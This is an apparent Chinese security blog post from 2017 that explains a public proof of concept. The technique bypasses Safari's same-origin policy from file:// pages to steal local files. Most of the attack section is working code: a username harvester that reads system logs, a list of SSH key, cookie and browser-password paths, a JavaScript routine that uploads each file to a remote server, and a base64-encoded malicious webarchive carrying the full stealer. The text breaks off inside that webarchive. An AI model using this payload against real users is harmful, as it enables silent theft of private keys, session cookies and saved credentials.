@@ -1,0 +1,995 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="同源策略," />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/ico/favicon.ico?v=5.1.0" />
+
+
+
+
+
+
+<meta name="description" content="国外研究者Bo0om公开了一种利用Safari同源策略绕过，读取本地文件并上传至远程服务器的攻击手法，并给出了PoC, 地址: https://github.com/Bo0oM/Safiler。一次有效的攻击，需要用户使用Safari浏览器本地读取(file://)恶意文档文件，因此攻击的范围是有限的，但是攻击手法中绕过同源策略和读取本地文件两种方式还是值得学习和研究的。">
+<meta name="keywords" content="同源策略">
+<meta property="og:type" content="article">
+<meta property="og:title" content="绕过Safari同源策略，偷取本地文件">
+<meta property="og:url" content="http://www.beesfun.com/2017/08/07/绕过Safari同源策略，偷取本地文件/index.html">
+<meta property="og:site_name" content="Ethan&#39; Blog">
+<meta property="og:description" content="国外研究者Bo0om公开了一种利用Safari同源策略绕过，读取本地文件并上传至远程服务器的攻击手法，并给出了PoC, 地址: https://github.com/Bo0oM/Safiler。一次有效的攻击，需要用户使用Safari浏览器本地读取(file://)恶意文档文件，因此攻击的范围是有限的，但是攻击手法中绕过同源策略和读取本地文件两种方式还是值得学习和研究的。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://www.beesfun.com/2017/08/07/绕过Safari同源策略，偷取本地文件/002.png">
+<meta property="og:image" content="http://www.beesfun.com/2017/08/07/绕过Safari同源策略，偷取本地文件/003.png">
+<meta property="og:image" content="http://www.beesfun.com/2017/08/07/绕过Safari同源策略，偷取本地文件/004.png">
+<meta property="og:image" content="http://www.beesfun.com/2017/08/07/绕过Safari同源策略，偷取本地文件/005.png">
+<meta property="og:image" content="http://www.beesfun.com/2017/08/07/绕过Safari同源策略，偷取本地文件/006.png">
+<meta property="og:image" content="http://www.beesfun.com/2017/08/07/绕过Safari同源策略，偷取本地文件/007.png">
+<meta property="og:updated_time" content="2017-08-31T01:14:44.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="绕过Safari同源策略，偷取本地文件">
+<meta name="twitter:description" content="国外研究者Bo0om公开了一种利用Safari同源策略绕过，读取本地文件并上传至远程服务器的攻击手法，并给出了PoC, 地址: https://github.com/Bo0oM/Safiler。一次有效的攻击，需要用户使用Safari浏览器本地读取(file://)恶意文档文件，因此攻击的范围是有限的，但是攻击手法中绕过同源策略和读取本地文件两种方式还是值得学习和研究的。">
+<meta name="twitter:image" content="http://www.beesfun.com/2017/08/07/绕过Safari同源策略，偷取本地文件/002.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    sidebar: {"position":"left","display":"post","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: 'undefined',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://www.beesfun.com/2017/08/07/绕过Safari同源策略，偷取本地文件/"/>
+
+
+
+
+
+  <title> 绕过Safari同源策略，偷取本地文件 | Ethan' Blog </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//tajs.qq.com/stats?sId=63078337";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Ethan' Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocapitalize="off" autocomplete="off" autocorrect="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://www.beesfun.com/2017/08/07/绕过Safari同源策略，偷取本地文件/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Ethan">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://avatars3.githubusercontent.com/u/15061633">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ethan' Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                绕过Safari同源策略，偷取本地文件
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-08-07T18:25:29+08:00">
+                2017-08-07
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Web安全/" itemprop="url" rel="index">
+                    <span itemprop="name">Web安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>国外研究者<a href="https://twitter.com/i_bo0om" target="_blank" rel="external">Bo0om</a>公开了一种利用Safari同源策略绕过，读取本地文件并上传至远程服务器的攻击手法，并给出了PoC, 地址: <a href="https://github.com/Bo0oM/Safiler" target="_blank" rel="external">https://github.com/Bo0oM/Safiler</a>。一次有效的攻击，需要用户使用<code>Safari</code>浏览器<code>本地读取(file://)</code>恶意文档文件，因此攻击的范围是有限的，但是攻击手法中绕过同源策略和读取本地文件两种方式还是值得学习和研究的。</p>
+<a id="more"></a>
+<h2 id="Safari-同源策略绕过"><a href="#Safari-同源策略绕过" class="headerlink" title="Safari 同源策略绕过"></a>Safari 同源策略绕过</h2><p>受同源策略的限制，网页中用<code>XMLHttpRequest</code>对象读取本地文件是被禁止的，从错误信息中可以看出Safari浏览器跨源请求仅仅支持HTTP,但实际情况却并非如此。</p>
+<img src="/2017/08/07/绕过Safari同源策略，偷取本地文件/002.png" alt="002.png" title="">
+<p>当Safari浏览器访问本地文件时，并不执行同源策略，用file协议打开一个HTML文件，包含在文件内的JavaScript代码可以绕过同源策略, 访问本地或远程文件。这样就可以做到读取本地文件，然后将文件内容发送给远程服务器了。</p>
+<img src="/2017/08/07/绕过Safari同源策略，偷取本地文件/003.png" alt="003.png" title="">
+<p>这个问题15年就有报道过，至今苹果也没有处理，可能是，默认情况下javascript不能列举本地目录，影响范围有限。但是结合苹果系统自身的特性，利用<code>.DS_Store</code>文件来读取文件夹目录，这样攻击效果就很可观了，这也是本次介绍的攻击方式中一个值得研究的利用手段。</p>
+<h2 id="读取本地文件"><a href="#读取本地文件" class="headerlink" title="读取本地文件"></a>读取本地文件</h2><p><code>.DS_store</code>(Desktop Services Store)是一种由苹果公司的Mac OS X操作系统所创造的隐藏文件，目的在于存贮目录的自定义属性，例如文件们的图标位置或者是背景色的选择。默认情况下，Mac OS X的Finder程序会在打开过的每个目录下创建.DS_Store文件(引自维基百科)。</p>
+<p>从<code>.DS_store</code>文件中可以解析出当前目录中的所有的文件名，解析代码如下:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="keyword">from</span> ds_store <span class="keyword">import</span> DSStore</div><div class="line"><span class="keyword">import</span> json</div><div class="line"></div><div class="line"></div><div class="line">path = <span class="string">'./.DS_Store'</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse</span><span class="params">(file)</span>:</span></div><div class="line">    filelist = []</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> file:</div><div class="line">        <span class="keyword">if</span> i.filename != <span class="string">'.'</span>:</div><div class="line">            filelist.append(i.filename)</div><div class="line">    <span class="keyword">return</span> list(set(filelist))</div><div class="line"></div><div class="line"></div><div class="line">d = DSStore.open(path, <span class="string">'r+'</span>)</div><div class="line">fileresult = parse(d)</div><div class="line">print(json.dumps(fileresult))</div><div class="line"><span class="keyword">for</span> name <span class="keyword">in</span> fileresult:</div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        d = DSStore.open(path + name+ <span class="string">'/.DS_Store'</span>, <span class="string">'r+'</span>)</div><div class="line">        fileresult = parse(d)</div><div class="line">        all.append(fileresult)</div><div class="line">        print(json.dumps(fileresult))</div><div class="line">    <span class="keyword">except</span>:</div><div class="line">        <span class="keyword">pass</span></div></pre></td></tr></table></figure>
+<p>运行: <code>python parse_ds.py</code>, 可以解析出当前目录下所有的文件名。</p>
+<img src="/2017/08/07/绕过Safari同源策略，偷取本地文件/004.png" alt="004.png" title="">
+<p>苹果系统中有价值的数据基本都在用户目录下，而不同电脑的用户名是不一样的。如果不知道用户名，那么就难以用file协议读取用户目录中<code>.DS_store</code>文件的内容，攻击效果将大打折扣。苹果系统中<code>/etc/passwd</code>文件是不含用户名信息的，但是在<code>/var/log/system.log</code>和 <code>/var/log/install.log</code>这两个系统创建的日志信息中, 通常都包含了用户的路径信息，可以通过简单的正则表达式进行匹配。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">getUser</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">        xhr.open(<span class="string">'GET'</span>, <span class="string">'/var/log/system.log;/https:%2f%2fgoogle.com/'</span>, <span class="literal">false</span>);</div><div class="line">        xhr.send();</div><div class="line">        <span class="keyword">return</span> xhr.responseText.match(<span class="comment">//Users/w+//g)[0];</span></div><div class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</div><div class="line">        xhr.open(<span class="string">'GET'</span>, <span class="string">'/var/log/install.log;/https:%2f%2fgoogle.com/'</span>, <span class="literal">false</span>);</div><div class="line">        xhr.send();</div><div class="line">        <span class="keyword">return</span> xhr.responseText.match(<span class="comment">//Users/w+//g)[0];</span></div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>这样就可以获取了完整的文件访问路径，结合<code>.DS_Store</code>文件内容获得文件和文件夹的层次结构。但是注意到，通常情况下只有用Finder打开的目录才会创建<code>.DS_Store</code>文件，而一些敏感文件目录通常是没有<code>.DS_Store</code>文件的，例如:<code>~/.ssh</code>。要获取这类的敏感文件，可以人为收集一些常见的敏感文件路径，弥补利用<code>.DS_Store</code>文件读取的不足。</p>
+<p>常见的一些敏感文件路径有</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">~/.ssh/id_rsa;</div><div class="line">~/.ssh/id_rsa.key;</div><div class="line">~/.ssh/id_rsa.pub;</div><div class="line">~/.ssh/known_hosts;</div><div class="line">~/.ssh/authorized_keys</div><div class="line"></div><div class="line">~/Library/Cookies/Cookies.binarycookies</div><div class="line">~/Library/Cookies/com.apple.Safari.cookies</div><div class="line"></div><div class="line"># 系统账户信息</div><div class="line">~/Library/Accounts/Accounts4.sqlite</div><div class="line"></div><div class="line">~/Library/Application Support/Google/Chrome/Default/Login Data</div><div class="line">~/Library/Application Support/Google/Chrome/Default/Cookies</div><div class="line">~/Library/Application Support/Google/Chrome/Default/History</div></pre></td></tr></table></figure>
+<h2 id="Safari打开恶意文档"><a href="#Safari打开恶意文档" class="headerlink" title="Safari打开恶意文档"></a>Safari打开恶意文档</h2><p>Safari打开本地创建的恶意xhtm文件<code>PoC.xhtm</code>，本地开启一个服务器接收发送的文件内容, 并解析<code>.DS_Store</code>文件的内容返回给前端js继续读取本地文件，核心代码如下：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">processFile</span>(<span class="params">file</span>) </span>&#123;</div><div class="line">    <span class="keyword">let</span> out = getFile(file),</div><div class="line">        xhr = <span class="keyword">new</span> XMLHttpRequest(),</div><div class="line">        formData = <span class="keyword">new</span> FormData()</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (!out) <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line"></div><div class="line">    formData.append(<span class="string">'file'</span>, out, file);</div><div class="line"></div><div class="line">    xhr.open(<span class="string">'POST'</span>, serverUrl);</div><div class="line">    xhr.onreadystatechange = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</div><div class="line">        <span class="keyword">if</span> (xhr.readyState === <span class="number">4</span> &amp;&amp; xhr.status === <span class="number">200</span> &amp;&amp; xhr.responseText.length &gt; <span class="number">3</span>) &#123;</div><div class="line">            <span class="keyword">let</span> response = <span class="built_in">JSON</span>.parse(xhr.responseText);</div><div class="line"></div><div class="line">            response.forEach(<span class="function"><span class="params">responseFile</span> =&gt;</span> &#123;</div><div class="line">                <span class="keyword">let</span> path = file.slice(<span class="number">0</span>, file.lastIndexOf(<span class="string">'/'</span>) + <span class="number">1</span>);</div><div class="line">                <span class="keyword">if</span> (processFile(path + responseFile) != <span class="literal">true</span>) &#123;</div><div class="line"></div><div class="line">                    processFile(path + responseFile + <span class="string">'/.DS_Store'</span>);</div><div class="line">                &#125;</div><div class="line"></div><div class="line">            &#125;)</div><div class="line">        &#125;</div><div class="line">    &#125;;</div><div class="line">    xhr.send(formData);</div><div class="line">    <span class="keyword">return</span> <span class="literal">true</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">getUser</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</div><div class="line"></div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">        xhr.open(<span class="string">'GET'</span>, <span class="string">'/var/log/system.log;/https:%2f%2fgoogle.com/'</span>, <span class="literal">false</span>);</div><div class="line">        xhr.send();</div><div class="line">        <span class="keyword">var</span> users = unique(xhr.responseText.match(<span class="regexp">/\/Users\/\w+\//g</span>));</div><div class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</div><div class="line">        xhr.open(<span class="string">'GET'</span>, <span class="string">'/var/log/install.log;/https:%2f%2fgoogle.com/'</span>, <span class="literal">false</span>);</div><div class="line">        xhr.send();</div><div class="line">        <span class="keyword">var</span> users = unique(xhr.responseText.match(<span class="regexp">/\/Users\/\w+\//g</span>));</div><div class="line">    &#125; <span class="keyword">finally</span> &#123;</div><div class="line">        <span class="keyword">return</span> users.find(<span class="function">(<span class="params">userstring</span>) =&gt;</span> &#123;</div><div class="line">            <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</div><div class="line">            xhr.open(<span class="string">'GET'</span>, userstring + <span class="string">'.DS_Store'</span>, <span class="literal">false</span>);</div><div class="line">            xhr.send();</div><div class="line">            <span class="keyword">return</span> xhr.responseText.length &gt; <span class="number">0</span></div><div class="line">        &#125;);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFile</span>(<span class="params">file</span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</div><div class="line"></div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">        <span class="built_in">console</span>.log(file);</div><div class="line">        xhr.open(<span class="string">'GET'</span>, file + <span class="string">';/https:%2f%2fgoogle.com/'</span>, <span class="literal">false</span>);</div><div class="line">        xhr.responseType = <span class="string">'blob'</span>;</div><div class="line">        xhr.send();</div><div class="line"></div><div class="line">        <span class="keyword">if</span> (xhr.response.size != <span class="number">0</span>) <span class="keyword">return</span> xhr.response</div><div class="line"></div><div class="line"></div><div class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</div><div class="line">        <span class="built_in">console</span>.log(e)</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<img src="/2017/08/07/绕过Safari同源策略，偷取本地文件/005.png" alt="005.png" title="">
+<p>打开这种本地创建的文件，可以看出攻击是有效的,文件内容会被存储到远程服务器上。</p>
+<p>如果文档不是用Safari打开的，而是用其他浏览器打开本地的HTML文档，如Chrome或Firefox, 那么什么也不会发生，幸运的是, 存在一种默认情况下用Safari浏览器打开的文件格式webarchive, webarchive文件是设计为在mscOS和windows系统上用Safari浏览器预览或保存网页，其格式不同于标准的HTML文件格式。设计一个恶意的webarchive格式文件如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</div><div class="line">&lt;!DOCTYPE plist PUBLIC &quot;-//Apple//DTD PLIST 1.0//EN&quot; &quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;&gt;</div><div class="line">&lt;plist version=&quot;1.0&quot;&gt;</div><div class="line">&lt;dict&gt;</div><div class="line">	&lt;key&gt;WebMainResource&lt;/key&gt;</div><div class="line">	&lt;dict&gt;</div><div class="line">		&lt;key&gt;WebResourceData&lt;/key&gt;</div><div class="line">		&lt;data&gt;	PHNjcmlwdD5jb25zdCBzZXJ2ZXJVcmw9J2h0dHA6Ly8wOjUwMDAnLHVzZXI9Z2V0VXNlcigpLGxpc3Q9Wycuc3NoL2lkX3JzYScsJy5zc2gva25vd25faG9zdHMnLCcuc3NoL2F1dGhvcml6ZWRfa2V5cycsJy5iYXNoX2hpc3RvcnknLCdMaWJyYXJ5L0Nvb2tpZXMvQ29va2llcy5iaW5hcnljb29raWVzJywnTGlicmFyeS9Db29raWVzL0hTVFMucGxpc3QnLCdMaWJyYXJ5L0Nvb2tpZXMvY29tLmFwcGxlLlNhZmFyaS5jb29raWVzJywnTGlicmFyeS9BY2NvdW50cy9BY2NvdW50czQuc3FsaXRlJywnTGlicmFyeS9BcHBsaWNhdGlvbiBTdXBwb3J0L0Nocm9taXVtL0RlZmF1bHQvTG9naW4gRGF0YScsJ0xpYnJhcnkvQXBwbGljYXRpb24gU3VwcG9ydC9DaHJvbWl1bS9EZWZhdWx0L0Nvb2tpZXMnLCdMaWJyYXJ5L0FwcGxpY2F0aW9uIFN1cHBvcnQvQ2hyb21pdW0vRGVmYXVsdC9IaXN0b3J5JywnTGlicmFyeS9BcHBsaWNhdGlvbiBTdXBwb3J0L0dvb2dsZS9DaHJvbWUvRGVmYXVsdC9Mb2dpbiBEYXRhJywnTGlicmFyeS9BcHBsaWNhdGlvbiBTdXBwb3J0L0dvb2dsZS9DaHJvbWUvRGVmYXVsdC9Db29raWVzJywnTGlicmFyeS9BcHBsaWNhdGlvbiBTdXBwb3J0L0dvb2dsZS9DaHJvbWUvRGVmYXVsdC9IaXN0b3J5JywnLlRyYXNoLy5EU19TdG9yZScsJ0RvY3VtZW50cy8uRFNfU3RvcmUnLCdEZXNrdG9wLy5EU19TdG9yZScsXS5tYXAoZmlsZT0+dXNlcisgZmlsZSk7bWFpbigpO2Z1bmN0aW9uIG1haW4oKXtsaXN0LmZvckVhY2gocHJvY2Vzc0ZpbGUpO30KZnVuY3Rpb24gdW5pcXVlKGFycil7dmFyIG9iaj17fTtmb3IodmFyIGk9MDtpPGFyci5sZW5ndGg7aSsrKXt2YXIgc3RyPWFycltpXTtvYmpbc3RyXT10cnVlO30KcmV0dXJuIE9iamVjdC5rZXlzKG9iaik7fQpmdW5jdGlvbiBwcm9jZXNzRmlsZShmaWxlKXtsZXQgb3V0PWdldEZpbGUoZmlsZSkseGhyPW5ldyBYTUxIdHRwUmVxdWVzdCgpLGZvcm1EYXRhPW5ldyBGb3JtRGF0YSgpCmlmKCFvdXQpcmV0dXJuIGZhbHNlO2Zvcm1EYXRhLmFwcGVuZCgnZmlsZScsb3V0LGZpbGUpO3hoci5vcGVuKCdQT1NUJyxzZXJ2ZXJVcmwpO3hoci5vbnJlYWR5c3RhdGVjaGFuZ2U9KCk9PntpZih4aHIucmVhZHlTdGF0ZT09PTQmJnhoci5zdGF0dXM9PT0yMDAmJnhoci5yZXNwb25zZVRleHQubGVuZ3RoPjMpe2xldCByZXNwb25zZT1KU09OLnBhcnNlKHhoci5yZXNwb25zZVRleHQpO3Jlc3BvbnNlLmZvckVhY2gocmVzcG9uc2VGaWxlPT57bGV0IHBhdGg9ZmlsZS5zbGljZSgwLGZpbGUubGFzdEluZGV4T2YoJy8nKSsgMSk7aWYocHJvY2Vzc0ZpbGUocGF0aCsgcmVzcG9uc2VGaWxlKSE9dHJ1ZSl7cHJvY2Vzc0ZpbGUocGF0aCsgcmVzcG9uc2VGaWxlKycvLkRTX1N0b3JlJyk7fX0pfX07eGhyLnNlbmQoZm9ybURhdGEpO3JldHVybiB0cnVlfQpmdW5jdGlvbiBnZXRVc2VyKCl7dmFyIHhocj1uZXcgWE1MSHR0cFJlcXVlc3QoKTt0cnl7eGhyLm9wZW4oJ0dFVCcsJ2ZpbGU6Ly8vdmFyL2xvZy9zeXN0ZW0ubG9nOy9odHRwczolMmYlMmZnb29nbGUuY29tLycsZmFsc2UpO3hoci5zZW5kKCk7dmFyIHVzZXJzPXVuaXF1ZSh4aHIucmVzcG9uc2VUZXh0Lm1hdGNoKC9cL1VzZXJzXC9cdytcLy9nKSk7fWNhdGNoKGUpe3hoci5vcGVuKCdHRVQnLCdmaWxlOi8vL3Zhci9sb2cvaW5zdGFsbC5sb2c7L2h0dHBzOiUyZiUyZmdvb2dsZS5jb20vJyxmYWxzZSk7eGhyLnNlbmQoKTt2YXIgdXNlcnM9dW5pcXVlKHhoci5yZXNwb25zZVRleHQubWF0Y2goL1wvVXNlcnNcL1x3K1wvL2cpKTt9ZmluYWxseXtyZXR1cm4gdXNlcnMuZmluZCgodXNlcnN0cmluZyk9Pnt2YXIgeGhyPW5ldyBYTUxIdHRwUmVxdWVzdCgpO3hoci5vcGVuKCdHRVQnLHVzZXJzdHJpbmcrJy5EU19TdG9yZScsZmFsc2UpO3hoci5zZW5kKCk7cmV0dXJuIHhoci5yZXNwb25zZVRleHQubGVuZ3RoPjB9KTt9fQpmdW5jdGlvbiBnZXRGaWxlKGZpbGUpe3ZhciB4aHI9bmV3IFhNTEh0dHBSZXF1ZXN0KCk7dHJ5e2NvbnNvbGUubG9nKGZpbGUpO3hoci5vcGVuKCdHRVQnLGZpbGUrJzsvaHR0cHM6JTJmJTJmZ29vZ2xlLmNvbS8nLGZhbHNlKTt4aHIucmVzcG9uc2VUeXBlPSdibG9iJzt4aHIuc2VuZCgpO2lmKHhoci5yZXNwb25zZS5zaXplIT0wKXJldHVybiB4aHIucmVzcG9uc2V9Y2F0Y2goZSl7Y29uc29sZS5sb2coZSl9fQo8L3NjcmlwdD4=</div><div class="line">		&lt;/data&gt;</div><div class="line">		&lt;key&gt;WebResourceFrameName&lt;/key&gt;</div><div class="line">		&lt;string&gt;&lt;/string&gt;</div><div class="line">		&lt;key&gt;WebResourceMIMEType&lt;/key&gt;</div><div class="line">		&lt;string&gt;text/html&lt;/string&gt;</div><div class="line">		